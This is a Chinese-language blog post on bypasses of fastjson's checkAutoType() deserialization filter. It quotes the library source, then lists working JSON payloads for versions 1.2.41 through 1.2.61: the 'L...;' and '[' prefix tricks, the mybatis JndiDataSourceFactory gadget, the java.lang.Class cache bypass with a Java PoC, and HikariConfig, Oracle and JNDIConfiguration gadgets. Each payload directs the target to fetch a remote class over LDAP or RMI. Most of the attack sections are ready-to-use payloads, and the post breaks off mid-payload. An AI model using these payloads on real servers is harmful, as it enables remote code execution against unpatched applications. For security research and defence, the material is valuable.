---
title: Java反序列化fastjson篇03-Fastjson各版本绕过
date: 2025-10-6 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

# 分析fastjson1.2.25是如何修复的

## 源码分析

修补方案就是将`DefaultJSONParser.parseObject()`函数中的`TypeUtils.loadClass`替换为`checkAutoType()`函数：

通过英文名也可以知道将直接加载修改为了检查

`checkAutoType()`函数:

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    }
 
    final String className = typeName.replace('$', '.');
 
    // autoTypeSupport默认为False
    // 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤
    if (autoTypeSupport || expectClass != null) {
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                return TypeUtils.loadClass(typeName, defaultClassLoader);
            }
        }
 
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }
 
    // 从Map缓存中获取类，注意这是后面版本的漏洞点
    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }
 
    if (clazz != null) {
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }
 
        return clazz;
    }
 
    // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错
    if (!autoTypeSupport) {
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
 
                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
        }
    }
 
    if (autoTypeSupport || expectClass != null) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
    }
 
    if (clazz != null) {
 
        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
            || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
           ) {
            throw new JSONException("autoType is not support. " + typeName);
        }
 
        if (expectClass != null) {
            if (expectClass.isAssignableFrom(clazz)) {
                return clazz;
            } else {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
        }
    }
 
    if (!autoTypeSupport) {
        throw new JSONException("autoType is not support. " + typeName);
    }
 
    return clazz;
}
```

简单地说，`checkAutoType()`函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。

默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。

## autoTypeSupport

autoTypeSupport是`checkAutoType()`函数出现后ParserConfig.java中新增的一个配置选项，在`checkAutoType()`函数的某些代码逻辑起到开关的作用。

默认情况下autoTypeSupport为False，将其设置为True有两种方法：

- JVM启动参数：`-Dfastjson.parser.autoTypeSupport=true`
- 代码中设置：`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`，如果有使用非全局ParserConfig则用另外调用`setAutoTypeSupport(true);`

AutoType白名单设置方法：

1. JVM启动参数：`-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.`
2. 代码中设置：`ParserConfig.getGlobalInstance().addAccept("com.xx.a");`
3. 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.`

# 1.2.25 - 1.2.41 补丁绕过

## 绕过方式

rmi服务器代码不变，还是使用之前的exp，会报错，类型不支持

![image-20251006182353139](https://image.liam317.top/2025/10/6afb1352beadf08fcf9357744ff72cf9.png)

绕过方式：`AutoTypeSupport`设置为`true`值，包名变为`Lcom.sun.rowset.JdbcRowSetImpl;`前面加`L`后面加分号

![image-20251006182542524](https://image.liam317.top/2025/10/181a670b7375bfbfcc3f6c0370e900cd.png)



## 调试分析

断点下在`ParserConfig`包下的`checkAutoType`

![image-20251006182755353](https://image.liam317.top/2025/10/d006283d94703271d0a705261b7267d7.png)

主要的绕过点就在`TypeUtiles`包中的`loadClass`，如果开头是`L`结尾是`分号`，那就截取第一个到最后一个减一，正好就是去除`L`和`;`的那一段

因为这段代码是在黑名单判断之后的，所以这里截取了之后就再不会被黑名单过滤了

![image-20251006183333265](https://image.liam317.top/2025/10/5a33e7a27860d69869cd11afbd75b9a8.png)

# 1.2.25-1.2.42 补丁绕过

## 绕过方式

exp

```json
{
	"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
	"dataSourceName":"ldap://localhost:1389/Exploit", 
	"autoCommit":true
}
```

写两个L和两个;，Fastjson会先提取一个，后面判断时还会删掉一个

# 1.2.25-1.2.43 补丁绕过

## 绕过方式

exp

```json
{
	"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
	"dataSourceName":"ldap://localhost:1389/Exploit",
	"autoCommit":true
}
```

# 1.2.25-1.2.45补丁绕过

## 绕过方式

**前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。**

直接给出payload，要连LDAP或RMI都可以：

```json
{
	"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
	"properties":
	{
		"data_source":"ldap://localhost:1389/Exploit"
	}
}
```

# 1.2.25-1.2.47补丁绕过

## 绕过方式

本次Fastjson反序列化漏洞也是基于`checkAutoType()`函数绕过的，并且**无需开启AutoTypeSupport**，大大提高了成功利用的概率。

绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，`checkAutoType()`就会抛出异常终止程序。

Demo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：

```java
import com.alibaba.fastjson.JSON;
 
public class JdbcRowSetImplPoc {
    public static void main(String[] argv){
        String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
                + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
```

# Fastjson <= 1.2.61 通杀

## Fastjson1.2.5 <= 1.2.59

**需要开启AutoType**

```java
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}
{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

## Fastjson1.2.5 <= 1.2.60

**需要开启 autoType：**

```java
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://10.10.20.166:1099/ExportObject"}

{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://10.10.20.166:1389/ExportObject"}
```

## Fastjson1.2.5 <= 1.2.61

```java
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploi
```

